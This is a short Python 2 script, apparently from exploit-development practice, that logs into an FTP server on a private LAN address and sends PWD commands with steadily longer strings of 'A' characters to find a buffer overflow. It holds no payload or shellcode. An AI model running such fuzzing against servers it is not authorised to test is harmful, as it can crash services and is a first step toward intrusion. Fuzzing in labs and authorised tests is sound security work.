#!/usr/bin/python
import socket,time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.109",21))
time.sleep(2)
r = s.recv(4096)
s.send("USER anonymous\r\n")
r = s.recv(1024)
s.send("PASS anonymous\r\n")
r = s.recv(1024)


buffer=["A"]
contador=100
while len(buffer) <= 25:
	buffer.append("A"*contador)
	contador+= 200

comandos = ["PWD"]

for comando in comandos:
	for string in buffer:
		print "Fuzzing comando %s user com %s bytes"%(comando,len(string))
		s.send("%s %s\r\n"%(comando,string))
		r = s.recv(1024)
